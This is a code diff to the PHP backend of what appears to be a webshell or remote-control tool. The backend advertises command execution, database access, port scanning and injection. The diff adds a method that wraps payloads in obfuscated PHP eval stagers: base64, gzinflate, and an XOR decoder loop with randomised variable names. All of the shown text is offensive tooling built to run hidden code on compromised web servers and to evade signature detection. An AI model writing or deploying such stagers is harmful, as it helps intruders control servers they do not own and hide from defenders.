@@ -4,6 +4,8 @@ from __future__ import annotations
 
 import base64
 
+from ...encoders import EncodedPayload
+from ...utils.strings import random_string
 from .base import Backend, CommandBuilder
 
 # Preference order: each maps a PHP function to a snippet that runs a
@@ -31,9 +33,26 @@ class PHPBackend(Backend):
     capabilities = frozenset(
         {"command", "fs", "mysql", "pgsql", "portscan", "inject", "mount"}
     )
+    supported_transforms = frozenset({"base64", "gzip", "xor"})
 
     def literal(self, value: str) -> str:
         return f"base64_decode('{base64.b64encode(value.encode()).decode()}')"
+
+    def wrap_eval(self, payload: EncodedPayload) -> str:
+        if payload.name == "base64":
+            return f"eval(base64_decode('{payload.b64}'));"
+        if payload.name == "gzip":
+            return f"eval(gzinflate(base64_decode('{payload.b64}')));"
+        if payload.name == "xor":
+            key = payload.params["key"]
+            var_d, var_k, var_o, var_i = (f"v{p}{random_string(4)}" for p in "dkoi")
+            return (
+                f"${var_d}=base64_decode('{payload.b64}');${var_k}='{key}';${var_o}='';"
+                f"for(${var_i}=0;${var_i}<strlen(${var_d});${var_i}++)"
+                f"{{${var_o}.=${var_d}[${var_i}]^${var_k}[${var_i}%strlen(${var_k})];}}"
+                f"eval(${var_o});"
+            )
+        raise ValueError(f"PHP backend cannot decode transform {payload.name!r}")
 
     def sentinel(self, token: str, code: str) -> str:
         return f"echo '{token}';{code};echo '{token}';"
